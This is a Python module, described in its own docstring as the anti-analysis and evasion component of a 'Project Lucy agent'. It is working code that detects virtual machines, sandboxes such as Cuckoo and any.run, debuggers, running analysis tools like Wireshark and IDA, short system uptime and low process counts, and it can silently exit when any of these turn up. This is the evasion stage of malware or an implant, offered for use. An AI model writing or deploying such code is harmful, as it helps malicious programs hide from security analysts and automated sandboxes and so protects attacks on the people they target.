"""
Anti-analysis / evasion module for Project Lucy agent.
Performs environment checks to detect sandboxes, VMs, and analysis tools.
The agent can exit or sleep based on the result.
"""
import os
import platform
import sys
import time

SYSTEM = platform.system()


def run(action: str = "check", exit_on_detect: bool = False, **kwargs) -> dict:
    checks = {
        "vm": _check_vm(),
        "sandbox": _check_sandbox(),
        "debugger": _check_debugger(),
        "analysis_tools": _check_analysis_tools(),
        "uptime": _check_uptime(),
        "user_activity": _check_user_activity(),
    }
    detected = [k for k, v in checks.items() if v]
    is_safe = len(detected) == 0

    if exit_on_detect and not is_safe:
        sys.exit(0)

    return {"safe": is_safe, "checks": checks, "detected": detected}


def _check_vm() -> bool:
    indicators = []

    if SYSTEM == "Windows":
        try:
            import subprocess
            out = subprocess.check_output(
                ["wmic", "computersystem", "get", "model"],
                text=True, timeout=3, stderr=subprocess.DEVNULL
            ).lower()
            vm_strings = ["virtualbox", "vmware", "qemu", "xen", "virtual", "hyper-v", "bochs", "parallels"]
            if any(s in out for s in vm_strings):
                return True
        except Exception:
            pass

        vm_reg_keys = [
            r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
            r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
        ]
        try:
            import winreg
            for key in vm_reg_keys:
                try:
                    parts = key.split("\\", 1)
                    root = getattr(winreg, "HKEY_" + parts[0][5:].replace(" ", "_"))
                    winreg.OpenKey(root, parts[1])
                    return True
                except Exception:
                    pass
        except Exception:
            pass

    elif SYSTEM == "Linux":
        dmi_paths = ["/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/product_name"]
        vm_strings = ["vmware", "virtualbox", "qemu", "kvm", "xen", "bochs"]
        for p in dmi_paths:
            try:
                content = open(p).read().lower()
                if any(s in content for s in vm_strings):
                    return True
            except Exception:
                pass

    return False


def _check_sandbox() -> bool:
    username = os.environ.get("USERNAME", os.environ.get("USER", "")).lower()
    sandbox_users = {"sandbox", "malware", "virus", "cuckoo", "sample", "test", "analysis"}
    if any(u in username for u in sandbox_users):
        return True

    hostname = platform.node().lower()
    sandbox_hosts = {"sandbox", "cuckoo", "malware", "virus", "analysis", "any.run"}
    if any(h in hostname for h in sandbox_hosts):
        return True

    if SYSTEM == "Windows":
        suspicious_paths = [
            r"C:\cuckoo", r"C:\analysis", r"C:\sandbox", r"C:\inetsim",
            r"C:\Users\Public\Documents\analysis",
        ]
        for p in suspicious_paths:
            if os.path.exists(p):
                return True

    return False


def _check_debugger() -> bool:
    if SYSTEM == "Windows":
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
        except Exception:
            pass

    return False


def _check_analysis_tools() -> bool:
    if SYSTEM == "Windows":
        try:
            import subprocess
            out = subprocess.check_output(
                ["tasklist"], text=True, timeout=5, stderr=subprocess.DEVNULL
            ).lower()
            tools = [
                "procmon", "procexp", "wireshark", "fiddler", "ida", "ollydbg",
                "x64dbg", "x32dbg", "cff explorer", "pe-bear", "dnspy",
                "tcpview", "regshot", "fakenet",
            ]
            if any(t in out for t in tools):
                return True
        except Exception:
            pass
    elif SYSTEM == "Linux":
        try:
            import subprocess
            out = subprocess.check_output(
                ["ps", "aux"], text=True, timeout=5, stderr=subprocess.DEVNULL
            ).lower()
            tools = ["strace", "ltrace", "gdb", "valgrind", "wireshark", "tcpdump"]
            if any(t in out for t in tools):
                return True
        except Exception:
            pass
    return False


def _check_uptime() -> bool:
    """Short system uptime is a sandbox indicator."""
    try:
        if SYSTEM == "Windows":
            import ctypes
            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
            return uptime_ms < 5 * 60 * 1000
        elif SYSTEM == "Linux":
            with open("/proc/uptime") as f:
                uptime_sec = float(f.read().split()[0])
                return uptime_sec < 300
    except Exception:
        pass
    return False


def _check_user_activity() -> bool:
    """Very few running processes may indicate a sandbox."""
    try:
        import subprocess
        if SYSTEM == "Windows":
            out = subprocess.check_output(["tasklist"], text=True, timeout=5, stderr=subprocess.DEVNULL)
            proc_count = len([l for l in out.splitlines() if ".exe" in l.lower()])
            return proc_count < 15
        elif SYSTEM == "Linux":
            out = subprocess.check_output(["ps", "aux"], text=True, timeout=5, stderr=subprocess.DEVNULL)
            return len(out.splitlines()) < 10
    except Exception:
        pass
    return False
